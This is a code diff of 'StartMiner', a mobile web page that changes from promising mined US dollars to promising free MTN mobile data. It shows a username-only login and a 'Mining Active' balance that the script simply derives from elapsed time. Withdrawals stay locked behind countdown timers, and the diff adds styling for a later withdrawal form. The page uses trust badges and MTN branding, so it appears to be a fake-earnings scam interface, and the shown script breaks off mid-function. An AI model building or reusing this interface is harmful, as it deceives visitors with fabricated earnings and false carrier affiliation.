@@ -3,7 +3,7 @@
   <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>StartMiner - Mine Real Dollars</title>
+  <title>StartMiner — Free MTN Data Daily</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
@@ -11,117 +11,167 @@
   :root{
     --gold:#f7a600;--gold2:#d48f00;
     --bg:#09090f;--card:#10101a;--border:#1e1e2e;
-    --text:#f1f5f9;--muted:#64748b;--green:#22c55e;--red:#ef4444;
+    --text:#f1f5f9;--muted:#64748b;
+    --green:#22c55e;--red:#ef4444;--blue:#3b82f6;
   }
   body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
   .page{display:none;min-height:100vh;flex-direction:column}
   .page.active{display:flex}
 
-  /* ===== LOGO ===== */
+  /* LOGO */
   .logo{display:flex;align-items:center;gap:10px}
-  .logo-icon{width:36px;height:36px;background:linear-gradient(135deg,var(--gold),var(--gold2));border-radius:10px;display:flex;align-items:center;justify-content:center;color:#000;font-size:16px;flex-shrink:0}
+  .logo-icon{width:36px;height:36px;background:linear-gradient(135deg,#ffcc00,#f7a600);border-radius:10px;display:flex;align-items:center;justify-content:center;color:#000;font-size:16px;flex-shrink:0}
   .logo-name{font-size:19px;font-weight:800;color:#fff}
   .logo-name em{color:var(--gold);font-style:normal}
 
-  /* ===== TOP NAV (simple) ===== */
-  .topbar{background:#0a0a14;border-bottom:1px solid var(--border);padding:0 20px;position:sticky;top:0;z-index:100}
-  .topbar-inner{max-width:900px;margin:0 auto;height:58px;display:flex;align-items:center;justify-content:space-between}
-  .user-chip{display:flex;align-items:center;gap:7px;background:rgba(247,166,0,0.08);border:1px solid rgba(247,166,0,0.18);padding:6px 14px;border-radius:100px;font-size:13px;font-weight:600;color:var(--gold)}
-  .logout-btn{background:none;border:none;color:var(--muted);cursor:pointer;font-size:13px;display:flex;align-items:center;gap:6px;font-family:'Inter',sans-serif;padding:6px 10px;border-radius:8px;transition:color 0.2s}
+  /* TOP BAR */
+  .topbar{background:#0a0a14;border-bottom:1px solid var(--border);padding:0 18px;position:sticky;top:0;z-index:100}
+  .topbar-inner{max-width:860px;margin:0 auto;height:56px;display:flex;align-items:center;justify-content:space-between}
+  .user-chip{display:flex;align-items:center;gap:7px;background:rgba(247,166,0,0.08);border:1px solid rgba(247,166,0,0.2);padding:5px 13px;border-radius:100px;font-size:13px;font-weight:600;color:var(--gold)}
+  .logout-btn{background:none;border:none;color:var(--muted);cursor:pointer;font-size:13px;display:flex;align-items:center;gap:5px;font-family:'Inter',sans-serif;padding:5px 8px;border-radius:8px;transition:color 0.2s}
   .logout-btn:hover{color:var(--red)}
 
-  /* ===== BOTTOM TAB BAR ===== */
-  .tab-bar{position:fixed;bottom:0;left:0;right:0;background:#0a0a14;border-top:1px solid var(--border);display:flex;z-index:200;padding-bottom:env(safe-area-inset-bottom)}
-  .tab{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:10px 8px;cursor:pointer;border:none;background:none;font-family:'Inter',sans-serif;transition:all 0.2s;gap:4px}
+  /* BOTTOM TAB BAR */
+  .tab-bar{position:fixed;bottom:0;left:0;right:0;background:#0a0a14;border-top:1px solid var(--border);display:grid;grid-template-columns:1fr 1fr;z-index:200;padding-bottom:env(safe-area-inset-bottom,0px)}
+  .tab{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:10px 8px;cursor:pointer;border:none;background:none;font-family:'Inter',sans-serif;gap:4px;transition:background 0.2s}
   .tab i{font-size:20px;color:var(--muted);transition:color 0.2s}
   .tab span{font-size:11px;color:var(--muted);font-weight:600;transition:color 0.2s}
-  .tab.active i,.tab.active span{color:var(--gold)}
-  .tab.active{background:rgba(247,166,0,0.04)}
-  .tab-lock i{color:var(--red) !important}
-  .tab-lock span{color:var(--red) !important}
+  .tab.on i,.tab.on span{color:var(--gold)}
+  .tab.on{background:rgba(247,166,0,0.04)}
+  .tab-wd i{color:#94a3b8 !important}
+  .tab-wd span{color:#94a3b8 !important}
+  .tab-wd.open-tab i{color:var(--green) !important}
+  .tab-wd.open-tab span{color:var(--green) !important}
 
-  /* ===== PAGE CONTENT ===== */
-  .page-body{flex:1;max-width:860px;margin:0 auto;width:100%;padding:24px 16px 90px}
+  /* BODY WRAPPER */
+  .page-body{flex:1;max-width:860px;margin:0 auto;width:100%;padding:22px 16px 90px}
 
-  /* ===== LOGIN PAGE ===== */
-  #loginPage{background:radial-gradient(ellipse at 50% 0%,rgba(247,166,0,0.09) 0%,transparent 55%),var(--bg);align-items:center;justify-content:center;padding:24px;min-height:100vh}
-  .login-box{width:100%;max-width:400px;background:var(--card);border:1px solid var(--border);border-radius:24px;padding:36px 28px}
+  /* ===== LOGIN ===== */
+  #loginPage{background:radial-gradient(ellipse at 50% 0%,rgba(247,166,0,0.09) 0%,transparent 55%),var(--bg);align-items:center;justify-content:center;padding:24px}
+  .login-box{width:100%;max-width:400px;background:var(--card);border:1px solid var(--border);border-radius:24px;padding:36px 26px}
   .login-box .logo{justify-content:center;margin-bottom:28px}
   .login-title{text-align:center;font-size:21px;font-weight:800;color:#fff;margin-bottom:6px}
-  .login-sub{text-align:center;font-size:14px;color:var(--muted);line-height:1.65;margin-bottom:26px}
+  .login-sub{text-align:center;font-size:14px;color:var(--muted);line-height:1.65;margin-bottom:24px}
   .field{position:relative;margin-bottom:14px}
-  .field i{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:var(--muted);font-size:15px;pointer-events:none}
-  .field input{width:100%;background:#080810;border:1.5px solid var(--border);border-radius:12px;padding:14px 14px 14px 42px;font-size:15px;color:#fff;font-family:'Inter',sans-serif;outline:none;transition:border-color 0.2s}
-  .field input:focus{border-color:var(--gold)}
+  .field i.fi{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--muted);font-size:14px;pointer-events:none}
+  .field input,.field select{width:100%;background:#080810;border:1.5px solid var(--border);border-radius:12px;padding:13px 13px 13px 40px;font-size:15px;color:#fff;font-family:'Inter',sans-serif;outline:none;transition:border-color 0.2s;-webkit-appearance:none}
+  .field input:focus,.field select:focus{border-color:var(--gold)}
   .field input::placeholder{color:var(--muted)}
-  .err{color:var(--red);font-size:13px;margin-bottom:12px;display:none;text-align:center}
+  .err{color:var(--red);font-size:13px;margin-bottom:12px;display:none;text-align:center;padding:8px;background:rgba(239,68,68,0.07);border-radius:8px}
   .btn-gold{width:100%;background:linear-gradient(135deg,var(--gold),var(--gold2));color:#000;border:none;padding:14px;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;font-family:'Inter',sans-serif;transition:all 0.2s}
   .btn-gold:hover{box-shadow:0 8px 28px rgba(247,166,0,0.3);transform:translateY(-1px)}
-  .login-footer{display:flex;justify-content:center;gap:18px;margin-top:20px;flex-wrap:wrap}
+  .btn-gold:disabled{opacity:0.5;cursor:not-allowed;transform:none;box-shadow:none}
+  .login-footer{display:flex;justify-content:center;gap:16px;margin-top:20px;flex-wrap:wrap}
   .login-footer span{font-size:12px;color:var(--muted);display:flex;align-items:center;gap:5px}
   .login-footer i{font-size:11px;color:var(--gold)}
 
-  /* ===== BALANCE CARD ===== */
-  .balance-card{background:var(--card);border:1px solid rgba(247,166,0,0.2);border-radius:20px;padding:24px;margin-bottom:16px;text-align:center}
-  .bal-label{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
-  .bal-num{font-size:50px;font-weight:800;color:#fff;font-variant-numeric:tabular-nums}
-  .bal-note{font-size:13px;color:var(--muted);margin:8px 0 16px}
-  .mining-pill{display:inline-flex;align-items:center;gap:7px;background:rgba(34,197,94,0.08);border:1px solid rgba(34,197,94,0.18);color:var(--green);padding:6px 16px;border-radius:100px;font-size:13px;font-weight:600;margin-bottom:16px}
+  /* ===== DASHBOARD ===== */
+  .welcome-bar{background:rgba(247,166,0,0.05);border:1px solid rgba(247,166,0,0.12);border-radius:14px;padding:15px 18px;margin-bottom:16px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
+  .welcome-bar h3{font-size:16px;font-weight:700;color:#fff}
+  .welcome-bar p{font-size:13px;color:var(--muted);margin-top:2px}
+  .live-pill{display:inline-flex;align-items:center;gap:6px;background:rgba(34,197,94,0.08);border:1px solid rgba(34,197,94,0.18);color:var(--green);padding:5px 13px;border-radius:100px;font-size:12px;font-weight:600;white-space:nowrap}
   .dot{width:7px;height:7px;background:var(--green);border-radius:50%;animation:blink 1.5s ease-in-out infinite}
   @keyframes blink{0%,100%{opacity:0.4;transform:scale(0.8)}50%{opacity:1;transform:scale(1.2)}}
+
+  /* BALANCE CARD */
+  .balance-card{background:var(--card);border:1px solid rgba(255,204,0,0.2);border-radius:20px;padding:24px;margin-bottom:16px;text-align:center}
+  .bal-label{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
+  .bal-data{font-size:48px;font-weight:800;color:#fff;font-variant-numeric:tabular-nums;line-height:1}
+  .bal-unit{font-size:20px;color:var(--gold);font-weight:700;margin-left:4px}
+  .bal-note{font-size:13px;color:var(--muted);margin:8px 0 16px}
+  .rate-pill{display:inline-flex;align-items:center;gap:6px;background:rgba(34,197,94,0.07);border:1px solid rgba(34,197,94,0.15);color:var(--green);padding:5px 14px;border-radius:100px;font-size:13px;font-weight:600;margin-bottom:16px}
   .prog-bar{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:100px;overflow:hidden}
-  .prog-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--gold),#ffd166);border-radius:100px;transition:width 1s ease}
+  .prog-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--gold),#ffcc00);border-radius:100px;transition:width 1s ease}
   .prog-row{display:flex;justify-content:space-between;margin-top:7px;font-size:12px;color:var(--muted)}
   .prog-row .pct{color:var(--gold);font-weight:700}
 
-  /* ===== GRID CARDS ===== */
+  /* MINI CARDS */
   .grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
   .mini-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:18px}
-  .mc-icon{width:40px;height:40px;background:rgba(247,166,0,0.08);border-radius:12px;display:flex;align-items:center;justify-content:center;color:var(--gold);font-size:17px;margin-bottom:12px}
+  .mc-icon{width:38px;height:38px;background:rgba(247,166,0,0.08);border-radius:11px;display:flex;align-items:center;justify-content:center;color:var(--gold);font-size:16px;margin-bottom:10px}
   .mc-num{font-size:22px;font-weight:800;color:#fff}
   .mc-lbl{font-size:12px;color:var(--muted);margin-top:3px}
 
-  /* ===== COUNTDOWN ===== */
+  /* COUNTDOWN CARD */
   .timer-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px;margin-bottom:16px}
-  .card-label{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:0.8px;margin-bottom:14px;display:flex;align-items:center;gap:7px}
-  .card-label i{color:var(--gold)}
+  .card-lbl{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:0.8px;margin-bottom:14px;display:flex;align-items:center;gap:7px}
+  .card-lbl i{color:var(--gold)}
   .timer-row{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
   .t-box{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:12px;padding:12px 6px;text-align:center}
   .t-num{font-size:26px;font-weight:800;color:#fff;font-variant-numeric:tabular-nums}
   .t-lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:2px}
 
-  /* ===== WITHDRAW NAV BUTTON ===== */
-  .go-withdraw-btn{width:100%;background:rgba(239,68,68,0.07);border:1.5px solid rgba(239,68,68,0.25);color:var(--red);padding:16px;border-radius:14px;font-size:15px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;font-family:'Inter',sans-serif;transition:all 0.2s;margin-bottom:16px}
-  .go-withdraw-btn:hover{background:rgba(239,68,68,0.13)}
-  .go-withdraw-btn .arrow{margin-left:auto;font-size:18px}
+  /* GO TO WITHDRAW BUTTON */
+  .go-wd-btn{width:100%;padding:16px;border-radius:14px;font-size:15px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;font-family:'Inter',sans-serif;transition:all 0.2s;border:1.5px solid;margin-bottom:16px}
+  .go-wd-btn.locked{background:rgba(239,68,68,0.06);border-color:rgba(239,68,68,0.22);color:var(--red)}
+  .go-wd-btn.unlocked{background:rgba(34,197,94,0.08);border-color:rgba(34,197,94,0.3);color:var(--green);animation:glow-green 2s ease-in-out infinite}
+  @keyframes glow-green{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,0.15)}50%{box-shadow:0 0 16px 0 rgba(34,197,94,0.25)}}
+  .go-wd-btn .arr{margin-left:auto}
 
-  /* ===== WELCOME BAR ===== */
-  .welcome-bar{background:rgba(247,166,0,0.05);border:1px solid rgba(247,166,0,0.12);border-radius:14px;padding:16px 18px;margin-bottom:16px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
-  .welcome-bar h3{font-size:16px;font-weight:700;color:#fff}
-  .welcome-bar p{font-size:13px;color:var(--muted);margin-top:2px}
-
-  /* ===== WITHDRAWAL LOCKED PAGE ===== */
-  .lock-card{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:32px 24px;text-align:center;margin-bottom:16px}
-  .lock-icon{width:88px;height:88px;background:rgba(239,68,68,0.07);border:2px solid rgba(239,68,68,0.2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:34px;color:var(--red);animation:pulse-red 2s ease-in-out infinite}
-  @keyframes pulse-red{0%,100%{box-shadow:0 0 0 0 rgba(239,68,68,0.18)}50%{box-shadow:0 0 0 14px rgba(239,68,68,0)}}
+  /* ===== WITHDRAW PAGE ===== */
+  /* LOCKED STATE */
+  .lock-card{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:30px 22px;text-align:center;margin-bottom:16px}
+  .lock-icon{width:84px;height:84px;background:rgba(239,68,68,0.07);border:2px solid rgba(239,68,68,0.2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 18px;font-size:32px;color:var(--red);animation:pulse-r 2.5s ease-in-out infinite}
+  @keyframes pulse-r{0%,100%{box-shadow:0 0 0 0 rgba(239,68,68,0.18)}50%{box-shadow:0 0 0 14px rgba(239,68,68,0)}}
   .lock-title{font-size:22px;font-weight:800;color:#fff;margin-bottom:8px}
   .lock-sub{font-size:14px;color:var(--muted);line-height:1.7;margin-bottom:20px}
   .bal-box{background:rgba(247,166,0,0.05);border:1px solid rgba(247,166,0,0.15);border-radius:14px;padding:18px;margin-bottom:20px}
-  .bal-box .lb{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
-  .bal-box .la{font-size:34px;font-weight:800;color:#fff}
-  .bal-box .ln{font-size:12px;color:var(--muted);margin-top:4px}
+  .bal-box .bb-lbl{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
+  .bal-box .bb-val{font-size:32px;font-weight:800;color:#fff}
+  .bal-box .bb-unit{font-size:15px;color:var(--gold);font-weight:700;margin-left:3px}
+  .bal-box .bb-note{font-size:12px;color:var(--muted);margin-top:5px}
   .w-timer-row{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin:14px 0}
   .wt-box{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:10px;padding:12px 6px;text-align:center}
   .wt-num{font-size:24px;font-weight:800;color:#fff;font-variant-numeric:tabular-nums}
   .wt-lbl{font-size:10px;color:var(--muted);text-transform:uppercase;margin-top:2px}
-  .feat-list{text-align:left;display:flex;flex-direction:column;gap:10px;margin:20px 0}
+  .feat-list{text-align:left;display:flex;flex-direction:column;gap:10px;margin:18px 0}
   .feat-item{display:flex;align-items:center;gap:10px;font-size:14px;color:#94a3b8}
   .feat-item i{color:var(--green);font-size:13px;flex-shrink:0}
 
+  /* OPEN STATE */
+  .open-card{background:var(--card);border:1px solid rgba(34,197,94,0.25);border-radius:20px;padding:28px 22px;margin-bottom:16px}
+  .open-header{text-align:center;margin-bottom:24px}
+  .open-icon{width:80px;height:80px;background:rgba(34,197,94,0.08);border:2px solid rgba(34,197,94,0.25);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:30px;color:var(--green);animation:pulse-g 2s ease-in-out infinite}
+  @keyframes pulse-g{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,0.18)}50%{box-shadow:0 0 0 14px rgba(34,197,94,0)}}
+  .open-title{font-size:22px;font-weight:800;color:#fff;margin-bottom:6px}
+  .open-sub{font-size:14px;color:var(--muted);line-height:1.6}
+  .close-timer{background:rgba(239,68,68,0.06);border:1px solid rgba(239,68,68,0.15);border-radius:12px;padding:14px 16px;margin-bottom:22px;display:flex;align-items:center;gap:10px;font-size:14px;color:#f87171;font-weight:600}
+  .close-timer i{flex-shrink:0}
+  .balance-display{background:rgba(247,166,0,0.06);border:1px solid rgba(247,166,0,0.18);border-radius:14px;padding:16px;margin-bottom:22px;text-align:center}
+  .bd-lbl{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
+  .bd-val{font-size:34px;font-weight:800;color:#fff}
+  .bd-unit{font-size:16px;color:var(--gold);font-weight:700;margin-left:3px}
+  .bd-note{font-size:12px;color:var(--muted);margin-top:4px}
+  .form-title{font-size:15px;font-weight:700;color:#fff;margin-bottom:14px;display:flex;align-items:center;gap:8px}
+  .form-title i{color:var(--gold)}
+  .input-group{margin-bottom:14px}
+  .input-group label{font-size:13px;color:var(--muted);font-weight:500;display:block;margin-bottom:6px}
+  .input-group input{width:100%;background:#080810;border:1.5px solid var(--border);border-radius:12px;padding:13px 16px;font-size:15px;color:#fff;font-family:'Inter',sans-serif;outline:none;transition:border-color 0.2s}
+  .input-group input:focus{border-color:var(--gold)}
+  .input-group input::placeholder{color:var(--muted)}
+  .btn-submit{width:100%;background:linear-gradient(135deg,var(--green),#16a34a);color:#fff;border:none;padding:15px;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:9px;font-family:'Inter',sans-serif;transition:all 0.2s;margin-top:6px}
+  .btn-submit:hover{box-shadow:0 8px 28px rgba(34,197,94,0.25);transform:translateY(-1px)}
+  .btn-submit:disabled{opacity:0.5;cursor:not-allowed;transform:none;box-shadow:none}
+  .form-note{font-size:12px;color:var(--muted);text-align:center;margin-top:12px;line-height:1.6}
+
+  /* SUCCESS */
+  .success-card{background:var(--card);border:1px solid rgba(34,197,94,0.25);border-radius:20px;padding:36px 24px;text-align:center;margin-bottom:16px}
+  .success-icon{width:80px;height:80px;background:rgba(34,197,94,0.1);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 18px;font-size:34px;color:var(--green)}
+  .success-title{font-size:22px;font-weight:800;color:#fff;margin-bottom:8px}
+  .success-sub{font-size:14px;color:var(--muted);line-height:1.7}
+
   /* TOAST */
-  .toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%) translateY(80px);background:#10101a;border:1px solid rgba(34,197,94,0.25);padding:11px 22px;border-radius:100px;display:flex;align-items:center;gap:9px;color:#e2e8f0;font-size:14px;font-weight:500;box-shadow:0 12px 40px rgba(0,0,0,0.5);opacity:0;transition:all 0.4s cubic-bezier(0.34,1.56,0.64,1);z-index:999;pointer-events:none;white-space:nowrap}
+  .toast{position:fixed;bottom:78px;left:50%;transform:translateX(-50%) translateY(80px);background:#10101a;border:1px solid rgba(34,197,94,0.25);padding:11px 22px;border-radius:100px;display:flex;align-items:center;gap:9px;color:#e2e8f0;font-size:14px;font-weight:500;box-shadow:0 12px 40px rgba(0,0,0,0.5);opacity:0;transition:all 0.4s cubic-bezier(0.34,1.56,0.64,1);z-index:999;pointer-events:none;white-space:nowrap}
   .toast.show{opacity:1;transform:translateX(-50%) translateY(0);pointer-events:auto}
   .toast i{color:var(--green)}
+
+  /* MTN BADGE */
+  .mtn-badge{display:inline-flex;align-items:center;gap:7px;background:rgba(255,204,0,0.1);border:1px solid rgba(255,204,0,0.25);color:#ffcc00;padding:5px 14px;border-radius:100px;font-size:12px;font-weight:700;letter-spacing:0.5px}
+
+  @media(max-width:480px){
+    .bal-data{font-size:38px}
+    .grid2{grid-template-columns:1fr 1fr}
+  }
   </style>
   </head>
   <body>
@@ -129,19 +179,22 @@
   <!-- ========== LOGIN PAGE ========== -->
   <div class="page active" id="loginPage">
     <div class="login-box">
-      <div class="logo"><div class="logo-icon"><i class="fas fa-coins"></i></div><div class="logo-name">Start<em>Miner</em></div></div>
+      <div class="logo"><div class="logo-icon"><i class="fas fa-signal"></i></div><div class="logo-name">Start<em>Miner</em></div></div>
+      <div style="text-align:center;margin-bottom:20px">
+        <div class="mtn-badge"><i class="fas fa-wifi"></i> MTN Data Rewards</div>
+      </div>
       <div class="login-title">Welcome to StartMiner</div>
-      <div class="login-sub">Enter your username to begin mining<br>US Dollars from your phone — free.</div>
+      <div class="login-sub">Enter your username to start earning<br>free MTN Data every day.</div>
       <div class="field">
-        <i class="fas fa-user"></i>
+        <i class="fi fas fa-user"></i>
         <input id="uInput" type="text" placeholder="Enter your username" maxlength="30" autocomplete="off">
       </div>
-      <div class="err" id="errMsg"></div>
-      <button class="btn-gold" onclick="doLogin()"><i class="fas fa-bolt"></i> Start Mining Now</button>
+      <div class="err" id="loginErr"></div>
+      <button class="btn-gold" onclick="doLogin()"><i class="fas fa-bolt"></i> Start Earning Now</button>
       <div class="login-footer">
         <span><i class="fas fa-lock"></i> No password needed</span>
         <span><i class="fas fa-shield-alt"></i> SSL Secured</span>
-        <span><i class="fas fa-user-check"></i> KYC Verified</span>
+        <span><i class="fas fa-wifi"></i> MTN Data Rewards</span>
       </div>
     </div>
   </div>
@@ -150,10 +203,10 @@
   <div class="page" id="dashPage">
     <div class="topbar">
       <div class="topbar-inner">
-        <div class="logo"><div class="logo-icon"><i class="fas fa-coins"></i></div><div class="logo-name">Start<em>Miner</em></div></div>
+        <div class="logo"><div class="logo-icon"><i class="fas fa-signal"></i></div><div class="logo-name">Start<em>Miner</em></div></div>
         <div style="display:flex;align-items:center;gap:10px">
           <div class="user-chip"><i class="fas fa-user"></i><span id="navUser">User</span></div>
-          <button class="logout-btn" onclick="doLogout()" title="Logout"><i class="fas fa-sign-out-alt"></i></button>
+          <button class="logout-btn" onclick="doLogout()"><i class="fas fa-sign-out-alt"></i></button>
         </div>
       </div>
     </div>
@@ -162,15 +215,18 @@
       <div class="welcome-bar">
         <div>
           <h3>Hello, <span id="wName">Miner</span>! 👋</h3>
-          <p>Your balance grows every second you mine.</p>
+          <p>Your MTN Data is accumulating right now.</p>
         </div>
-        <div class="mining-pill"><span class="dot"></span> Mining Active</div>
+        <div class="live-pill"><span class="dot"></span> Mining Active</div>
       </div>
 
       <div class="balance-card">
-        <div class="bal-label">Your Current Balance</div>
-        <div class="bal-num">$<span id="dBal">0.0000</span></div>
-        <div class="bal-note">Earning +$0.0031 per hour automatically</div>
+        <div class="bal-label"><i class="fas fa-wifi" style="color:var(--gold);margin-right:5px"></i> Your MTN Data Balance</div>
+        <div>
+          <span class="bal-data" id="dBal">0.00</span><span class="bal-unit" id="dUnit">MB</span>
+        </div>
+        <div class="bal-note">Balance grows automatically every second</div>
+        <div class="rate-pill"><i class="fas fa-arrow-up"></i> +<span id="rateLabel">1.4 MB</span> per hour</div>
         <div class="prog-bar"><div class="prog-fill" id="dFill"></div></div>
         <div class="prog-row">
           <span><i class="fas fa-cog fa-spin" style="color:var(--gold);margin-right:4px"></i>Withdrawal preparation</span>
@@ -192,7 +248,7 @@
       </div>
 
       <div class="timer-card">
-        <div class="card-label"><i class="fas fa-hourglass-half"></i> Withdrawal Opens In</div>
+        <div class="card-lbl" id="dashTimerLabel"><i class="fas fa-hourglass-half"></i> Withdrawal Opens In</div>
         <div class="timer-row">
           <div class="t-box"><div class="t-num" id="dDay">00</div><div class="t-lbl">Days</div></div>
           <div class="t-box"><div class="t-num" id="dHr">00</div><div class="t-lbl">Hours</div></div>
@@ -201,23 +257,16 @@
         </div>
       </div>
 
-      <button class="go-withdraw-btn" onclick="showPage('withdraw')">
-        <i class="fas fa-lock"></i>
-        <span>Go to Withdrawal Page</span>
-        <span class="arrow"><i class="fas fa-chevron-right"></i></span>
+      <button class="go-wd-btn locked" id="goWdBtn" onclick="showPage('withdraw')">
+        <i class="fas fa-lock" id="goWdIcon"></i>
+        <span id="goWdText">Withdrawal Locked — Opens July 23</span>
+        <span class="arr"><i class="fas fa-chevron-right"></i></span>
       </button>
     </div>
 
-    <!-- Bottom Tab Bar -->
     <div class="tab-bar">
-      <button class="tab active" id="tab-dash" onclick="showPage('dash')">
-        <i class="fas fa-tachometer-alt"></i>
-        <span>Dashboard</span>
-      </button>
-      <button class="tab tab-lock" id="tab-withdraw" onclick="showPage('withdraw')">
-        <i class="fas fa-lock"></i>
-        <span>Withdraw</span>
-      </button>
+      <button class="tab on" onclick="showPage('dash')"><i class="fas fa-tachometer-alt"></i><span>Dashboard</span></button>
+      <button class="tab tab-wd" id="tabWd1" onclick="showPage('withdraw')"><i class="fas fa-wallet"></i><span>Withdraw</span></button>
     </div>
   </div>
 
@@ -225,54 +274,21 @@
   <div class="page" id="withdrawPage">
     <div class="topbar">
       <div class="topbar-inner">
-        <div class="logo"><div class="logo-icon"><i class="fas fa-coins"></i></div><div class="logo-name">Start<em>Miner</em></div></div>
+        <div class="logo"><div class="logo-icon"><i class="fas fa-signal"></i></div><div class="logo-name">Start<em>Miner</em></div></div>
         <div style="display:flex;align-items:center;gap:10px">
           <div class="user-chip"><i class="fas fa-user"></i><span id="wNavUser">User</span></div>
-          <button class="logout-btn" onclick="doLogout()" title="Logout"><i class="fas fa-sign-out-alt"></i></button>
+          <button class="logout-btn" onclick="doLogout()"><i class="fas fa-sign-out-alt"></i></button>
         </div>
       </div>
     </div>
 
-    <div class="page-body">
-      <div class="lock-card">
-        <div class="lock-icon"><i class="fas fa-lock"></i></div>
-        <div class="lock-title">Withdrawal Locked</div>
-        <div class="lock-sub">We're building the most secure withdrawal system. Your balance is safe and growing. Cash out the moment it opens!</div>
-
-        <div class="bal-box">
-          <div class="lb">Your Balance Ready to Withdraw</div>
-          <div class="la">$<span id="wBal">0.0000</span></div>
-          <div class="ln">Keep mining — this amount grows every second</div>
-        </div>
-
-        <div class="card-label" style="justify-content:center"><i class="fas fa-clock"></i> Opens In</div>
-        <div class="w-timer-row">
-          <div class="wt-box"><div class="wt-num" id="wDay">00</div><div class="wt-lbl">Days</div></div>
-          <div class="wt-box"><div class="wt-num" id="wHr">00</div><div class="wt-lbl">Hours</div></div>
-          <div class="wt-box"><div class="wt-num" id="wMin">00</div><div class="wt-lbl">Mins</div></div>
-          <div class="wt-box"><div class="wt-num" id="wSec">00</div><div class="wt-lbl">Secs</div></div>
-        </div>
-
-        <div class="feat-list">
-          <div class="feat-item"><i class="fas fa-check-circle"></i> Withdraw to bank account or crypto wallet</div>
-          <div class="feat-item"><i class="fas fa-check-circle"></i> Minimum withdrawal: $5.00</div>
-          <div class="feat-item"><i class="fas fa-check-circle"></i> Instant processing after KYC verification</div>
-          <div class="feat-item"><i class="fas fa-check-circle"></i> Zero withdrawal fees</div>
-          <div class="feat-item"><i class="fas fa-check-circle"></i> 256-bit SSL encrypted transactions</div>
-        </div>
-      </div>
+    <div class="page-body" id="withdrawBody">
+      <!-- filled by JS -->
     </div>
 
-    <!-- Bottom Tab Bar -->
     <div class="tab-bar">
-      <button class="tab" id="tab-dash2" onclick="showPage('dash')">
-        <i class="fas fa-tachometer-alt"></i>
-        <span>Dashboard</span>
-      </button>
-      <button class="tab tab-lock active" id="tab-withdraw2" onclick="showPage('withdraw')">
-        <i class="fas fa-lock"></i>
-        <span>Withdraw</span>
-      </button>
+      <button class="tab" onclick="showPage('dash')"><i class="fas fa-tachometer-alt"></i><span>Dashboard</span></button>
+      <button class="tab tab-wd on" id="tabWd2" onclick="showPage('withdraw')"><i class="fas fa-wallet"></i><span>Withdraw</span></button>
     </div>
   </div>
 
@@ -280,54 +296,250 @@
 
   <script>
   (function(){
-    var TARGET = new Date("2026-07-23T00:00:00Z").getTime();
-    var START  = new Date("2026-06-23T00:00:00Z").getTime();
-    var RATE   = 0.0031;
+    // ===== CYCLE CONFIG =====
+    // Every 30 days = mining phase. Then 24hrs open. Then repeats.
+    var CYCLE_LOCK_MS = 30 * 24 * 3600 * 1000;  // 30 days locked
+    var CYCLE_OPEN_MS =  1 * 24 * 3600 * 1000;  // 24 hrs open
+    var CYCLE_TOTAL   = CYCLE_LOCK_MS + CYCLE_OPEN_MS;
+    var BASE          = new Date("2026-06-23T00:00:00Z").getTime();
 
-    function pad(n){ return String(n).padStart(2,"0"); }
+    // MTN Data rate: ~1000 MB over 30 days = 1.389 MB/hr
+    var RATE_MB_PER_MS = 1000 / CYCLE_LOCK_MS; // MB per ms during lock phase
 
-    function tick(){
+    var currentUser = "";
+
+    // ===== HELPERS =====
+    function pad(n){ return String(Math.floor(n)).padStart(2,"0"); }
+    function set(id,v){ var e=document.getElementById(id); if(e) e.textContent=v; }
+
+    function getState(){
       var now = Date.now();
-      var diff = Math.max(0, TARGET - now);
-      var d=pad(Math.floor(diff/86400000));
-      var h=pad(Math.floor(diff/3600000)%24);
-      var m=pad(Math.floor(diff/60000)%60);
-      var s=pad(Math.floor(diff/1000)%60);
-
